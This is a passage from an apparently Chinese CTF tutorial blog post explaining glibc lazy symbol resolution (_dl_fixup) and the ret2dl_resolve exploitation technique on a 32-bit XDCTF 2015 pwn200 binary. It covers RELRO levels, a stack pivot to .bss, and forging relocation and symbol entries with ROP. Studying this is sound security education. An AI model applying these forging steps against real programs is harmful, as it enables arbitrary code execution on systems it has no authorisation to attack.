<span class="comment">//            Elf32_Word	st_size;</span></span><br><span class="line">    <span class="comment">//            unsigned char	st_info;</span></span><br><span class="line">    <span class="comment">//            unsigned char	st_other;</span></span><br><span class="line">    <span class="comment">//            Elf32_Half	st_shndx;</span></span><br><span class="line">    <span class="comment">//        &#125; Elf32_Sym;</span></span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 4.解析符号</span></span><br><span class="line">    <span class="comment">//从strtab偏移Elf32_Sym.st_name处找到符号名,</span></span><br><span class="line">    <span class="comment">//从链表相接的各个模块的link_map入手,遍历各个模块,寻找该符号名,如果找到,result返回对应模块的link_map</span></span><br><span class="line">    <span class="comment">//同时sym废物利用,从对应模块的符号表中抄了同名的符号过来,但是这个符号是有虚拟地址的</span></span><br><span class="line">	result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// result中保存着目标模块的基地址,加上目标符号的偏移量,得到该符号纯纯的虚拟地址,放到value里</span></span><br><span class="line">    <span class="comment">// 这里DL_FIXUP_MAKE_VALUE(map,addr) = addr,纯纯弱智</span></span><br><span class="line">	value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5.回写GOT表</span></span><br><span class="line">    <span class="comment">//最后把value写入相应的GOT表条目中,rel_addr就是GOT地址</span></span><br><span class="line">	<span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在图上意思意思</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193758449.png"
alt="image-20240819193758449" />
<figcaption aria-hidden="true">image-20240819193758449</figcaption>
</figure>
<p>下面详细说明每一步</p>
<h3 id="由主模块link_map找dynamic节">1.由主模块link_map找dynamic节</h3>
<p>这个<code>link_map</code>中有一个成员叫<code>l_info</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.		dynamic节的索引指针</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">   	...</span><br></pre></td></tr></table></figure>
<p><code>l_info</code>的类型是<code>ElfW(Dyn)**</code>,也就是<code>Elf32_Dyn**</code>，这是一个二级指针，或者说数组指针</p>
<p>意思是在内存某个地方有一个<code>dynamic</code>数组，然后这个指针指向数组的基地址</p>
<p>在运行时<code>l_info</code>指向所在模块的的<code>dynamic</code>节</p>
<p><code>dynamic</code>节加载进入内存的地址是确定的，比如本程序中在<code>0x080497c4</code>,可以使用<code>readelf -S</code>查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/dustball/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">32</span>/no-relro]</span><br><span class="line">└─<span class="meta"># readelf -S main_no_relro_32</span></span><br><span class="line">There are <span class="number">30</span> section headers, starting at offset <span class="number">0x10b0</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">	...</span><br><span class="line">  [<span class="number">21</span>] .dynamic          DYNAMIC         <span class="number">080497</span>c4 <span class="number">0007</span>c4 <span class="number">0000e8</span> <span class="number">08</span>  WA  <span class="number">6</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>在<code>GOT.PLT</code>表的最头部,也保存着一个<code>_DYNAMIC</code>的指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GOT.PLT[0] =&gt; _DYNAMIC</span><br><span class="line">GOT.PLT[1] =&gt; link_map</span><br><span class="line">GOT.PLT[2] =&gt; dl_runtime_resolve</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>dynamic节中的内容可以用<code>readelf -d</code>查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/dustball/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">32</span>/no-relro]</span><br><span class="line">└─<span class="meta"># readelf -d main_no_relro_32</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0x7c4</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x804832c</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x8048634</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x80497bc</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x80497c0</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x804818c</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804824c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">107</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x80498b8</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">40</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x8048304</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x80482ec</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x80482cc</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x80482b8</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>每一项都是一个<code>Elf32_Dyn</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080497C4 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:080497C4                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:080497C4                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:080497CC                 Elf32_Dyn &lt;0Ch, &lt;804832Ch&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:080497D4                 Elf32_Dyn &lt;0Dh, &lt;8048634h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:080497DC                 Elf32_Dyn &lt;19h, &lt;80497BCh&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:080497E4                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:080497EC                 Elf32_Dyn &lt;1Ah, &lt;80497C0h&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:080497F4                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:080497FC                 Elf32_Dyn &lt;6FFFFEF5h, &lt;804818Ch&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049804                 Elf32_Dyn &lt;5, &lt;804824Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:0804980C                 Elf32_Dyn &lt;6, &lt;80481ACh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049814                 Elf32_Dyn &lt;0Ah, &lt;6Bh&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:0804981C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049824                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:0804982C                 Elf32_Dyn &lt;3, &lt;80498B8h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049834                 Elf32_Dyn &lt;2, &lt;28h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:0804983C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049844                 Elf32_Dyn &lt;17h, &lt;8048304h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:0804984C                 Elf32_Dyn &lt;11h, &lt;80482ECh&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049854                 Elf32_Dyn &lt;12h, &lt;18h&gt;&gt;  ; DT_RELSZ</span><br><span class="line">LOAD:0804985C                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049864                 Elf32_Dyn &lt;6FFFFFFEh, &lt;80482CCh&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:0804986C                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049874                 Elf32_Dyn &lt;6FFFFFF0h, &lt;80482B8h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:0804987C                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype Elf32_Dyn</span><br><span class="line">type = <span class="keyword">struct</span> &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="由dynamic节找其他各节">2.由dynamic节找其他各节</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">symtab 	= (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">strtab 	= (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);	</span><br><span class="line">pltgot 	= (<span class="type">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);		<span class="comment">//实际上_dl_fixup中没有用到</span></span><br><span class="line">reloc 	= (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));</span><br></pre></td></tr></table></figure>
<p>这里有四个节,实际上每个节都是表</p>
<table>
<colgroup>
<col style="width: 17%" />
<col style="width: 17%" />
<col style="width: 65%" />
</colgroup>
<thead>
<tr>
<th>表名</th>
<th>元素类型</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>symtab符号表</td>
<td>struct Elf32_Sym</td>
<td>保存符号名在strtab中的偏移,<br />保存符号在模块中的相对地址<br />...</td>
</tr>
<tr>
<td>strtab字符串表</td>
<td>char</td>
<td>保存本模块中所有需要动态链接的符号名</td>
</tr>
<tr>
<td>pltgot过程链接表</td>
<td></td>
<td>实际上<code>_dl_fixup</code>中没有用到</td>
</tr>
<tr>
<td>jmprel重定位表</td>
<td>struct Elf32_Rel</td>
<td>保存符号的虚拟地址,<br />保存符号在符号表中的偏移</td>
</tr>
</tbody>
</table>
<p>symtab符号表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span><span class="comment">//符号名在strtab中的偏移</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span>	<span class="comment">//符号在其模块中相对地址</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>jmprel重定位表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<h3
id="在本模块符号表中找到对应表项">3.在本模块符号表中找到对应表项</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));<span class="comment">//在重定位表中的表项</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];	<span class="comment">//在符号表中的表项</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;	<span class="comment">//副本</span></span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);	<span class="comment">//GOT表项地址,为后来回填做准备</span></span><br></pre></td></tr></table></figure>
<p>下面到4之前是一些检查,忽略</p>
<h3 id="解析符号">4.解析符号</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 	<span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>* <span class="title">result</span>;</span></span><br><span class="line"> 	Elf32_Addr value;</span><br><span class="line"></span><br><span class="line">result = _dl_lookup_symbol_x (</span><br><span class="line">         strtab + sym-&gt;st_name, 		<span class="comment">//符号名字符串</span></span><br><span class="line">         l, 							<span class="comment">//本模块的link_map</span></span><br><span class="line">         &amp;sym, 						<span class="comment">//返回值,如果在其他模块找到该符号则返回其符号表项</span></span><br><span class="line">         l-&gt;l_scope,</span><br><span class="line">         version, </span><br><span class="line">         ELF_RTYPE_CLASS_PLT, </span><br><span class="line">         flags, </span><br><span class="line">         <span class="literal">NULL</span></span><br><span class="line">     );<span class="comment">//返回值result是找到符号实现所在模块的link_map</span></span><br><span class="line"></span><br><span class="line">     value = DL_FIXUP_MAKE_VALUE (</span><br><span class="line">         result,</span><br><span class="line">         SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>)<span class="comment">//从link_map *result中提取目标模块基地址,加上sym.st_value偏移量得到符号虚拟地址</span></span><br><span class="line">     );</span><br></pre></td></tr></table></figure>
<h3 id="回填got表项">5.回填GOT表项</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure>
<p>这里有一个压行,干了两个事情,</p>
<p>一是调用elf_machine_fixup_plt把value回写到rel_addr上</p>
<p>二是把value值,也就是已经解析出来的符号地址,放到eax寄存器上返回</p>
<p>注意此时是在dl_fixup中返回到dl_runtime_resolve中</p>
<p>下面的指令是这样的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">call _dl_fixup		# Call resolver.</span><br><span class="line">popl %edx		# Get <span class="keyword">register</span> content back.</span><br><span class="line">movl (%esp), %ecx</span><br><span class="line">movl %eax, (%esp)	# Store the function address.</span><br><span class="line">movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">ret $<span class="number">12</span>			# Jump to function address.</span><br></pre></td></tr></table></figure>
<p>注意到dl_runtime_resolve返回之前,栈顶是刚刚放入的eax,也就是刚解析出来的符号值</p>
<p>也就是直接 ret2目标函数 了</p>
<h2 id="ret2dl_resolve">ret2dl_resolve</h2>
<p>能不能进行这种利用,得看RELRO✌的脸色</p>
<p>RELRO保护:</p>
<p>read only relocation,只读重定位</p>
<p>鉴于攻击者可以篡改GOT表,填充危险函数,因此如果GOT表是只读的,攻击者就没法写了</p>
<p>RELRO的目的是保护函数指针,防止篡改</p>
<table style="width:100%;">
<colgroup>
<col style="width: 14%" />
<col style="width: 68%" />
<col style="width: 4%" />
<col style="width: 11%" />
</colgroup>
<thead>
<tr>
<th>保护程度</th>
<th>效果</th>
<th></th>
<th>编译选项</th>
</tr>
</thead>
<tbody>
<tr>
<td>NO_RELRO</td>
<td>dynamic段可写<br />GOT表可写,允许延迟绑定</td>
<td></td>
<td>-z norelro</td>
</tr>
<tr>
<td>PARTIAL_RELRO</td>
<td>dynamic段只读,<br />但是GOT表还是可写的,允许延迟绑定</td>
<td></td>
<td>-z lazy</td>
</tr>
<tr>
<td>FULL_RELRO</td>
<td>dynamic段只读<br />GOT表只读,不允许延迟绑定,所有符号必须在加载程序时立刻解析</td>
<td></td>
<td>-z now</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>回顾<code>_dl_fixup</code>函数解析符号的过程</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193758449.png"
alt="image-20240819193758449" />
<figcaption aria-hidden="true">image-20240819193758449</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Algorithm _dl_fixup</span><br><span class="line">Input:	a Link_Map linkmap of the Main module, an index reloc_arg of the jmprel table </span><br><span class="line">Output:	virtual address of the target symbol</span><br><span class="line"></span><br><span class="line">dynamic = linkmap.l_info</span><br><span class="line">jmprel = dynamic[DT_JMPREL]</span><br><span class="line">strtab = dynamic[DT_STRTAB]</span><br><span class="line">symtab = dynamic[DT_SYMTAB]</span><br><span class="line"></span><br><span class="line">reloc = jmprel[reloc_arg]</span><br><span class="line">sym = symtab[reloc.r_info]</span><br><span class="line">str = strtab[sym.st_name]</span><br><span class="line"></span><br><span class="line"><span class="comment">//other_linkmap是其他模块的Link_Map结构</span></span><br><span class="line"><span class="comment">//_dl_lookup_symbol_x(str)从其他模块中寻找str符号,如果找到则返回该符号与其所在的link_map</span></span><br><span class="line">[sym,other_linkmap] = _dl_lookup_symbol_x(str)</span><br><span class="line"></span><br><span class="line"><span class="comment">//link_map中保存着目标模块的基地址,sym中保存着符号相对目标模块的偏移量,加起来得到符号的虚拟地址</span></span><br><span class="line">vaddr = other_linkmap.laddr + sym.st_info</span><br></pre></td></tr></table></figure>
<h3 id="no_relro">no_relro</h3>
<p>strtab节通常和text节加载到同一个只读段,因此在strtab上篡改函数名字符串是不可能的</p>
<p>在no_relro保护下,dynamic节可写, 可以篡改dynamic.strtab指针指向fake
strtab</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193931068.png"
alt="image-20240819193931068" />
<figcaption aria-hidden="true">image-20240819193931068</figcaption>
</figure>
<h3 id="partial_relro">partial_relro</h3>
<p>在no_relro保护中，可以通过篡改dynamic节中的指针指向假的strtab伪造假的函数名</p>
<p>但是partial_relro保护使得dynamic节只读，无法篡改其中的字符串表指针</p>
<h4 id="stage1">stage1</h4>
<p>由于我们需要构造“/bin/sh”这种字符串,要么调用read函数往内存里写,要么溢出时写进去</p>
<p>前者需要再构造read调用的rop链,并且还得给字符串找地方,找一个我们知道地址并且可写的地方,比如bss段</p>
<p>后者由于栈地址不知道在哪,需要做一个栈迁移,首先把栈搬到bss段上</p>
<p>后者更加方便,采取后者</p>
<h4 id="stage2">stage2</h4>
<p>在本阶段我们构造rop链条,手动调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dl_runtime_resolve@.GOT.PLT[0](</span><br><span class="line">	link_map=.GOT.PLT[1]</span><br><span class="line">	reloc_arg=0x20</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><strong>也就是再解析调用一下write函数,目的是验证一下,已经解析过的符号,使用rop方法能够再次触发解析过程,并且该过程是正确的</strong></p>
<h4 id="stage3">stage3</h4>
<p>在本阶段我们在bss段伪造一个重定位表项,
但是该表项的内容指向正确的symtab表</p>
<p>为了使用这个假重定位表项,我们将dl_runtime_resolve的参数reloc_arg改成,该bss段假表项与真的重定位表的偏移量</p>
<p>该偏移量显然会大的离谱,远远超出重定位表的范围,因为bss和relplt段相距甚远</p>
<p><strong>此举目的是验证即使传递的reloc_arg超过重定位表范围,也没有任何安全检查阻拦,使得我们能够正确解析到符号</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819195308717.png"
alt="image-20240819195308717" />
<figcaption aria-hidden="true">image-20240819195308717</figcaption>
</figure>
<h4 id="stage4">stage4</h4>
<p>在本阶段我们既要构造假的重定位表项,又要构造假的符号表项</p>
<p>此时假重定位表项不再指向正确的符号,而是指向我们构造的符号</p>
<p>但是这个假符号依然索引正确的符号名称</p>
<p>显然此时reloc_arg索引重定位表的偏移量远超重定位表范围,并且假重定位项索引假符号的偏移量也远超了符号表范围</p>
<p><strong>此举目的是验证,即使符号表的索引越界,也没有任何安全检查阻拦,使得我们能够正确解析到符号</strong></p>
<figure>
<img
src="C:\Users\xidian\AppData\Roaming\Typora\typora-user-images\image-20240819193641215.png"
alt="image-20240819193641215" />
<figcaption aria-hidden="true">image-20240819193641215</figcaption>
</figure>
<p>想法很好,然而在dl_runtime_resolve中,r_info不只会被用来索引符号表,还会索引versym符号版本表</p>
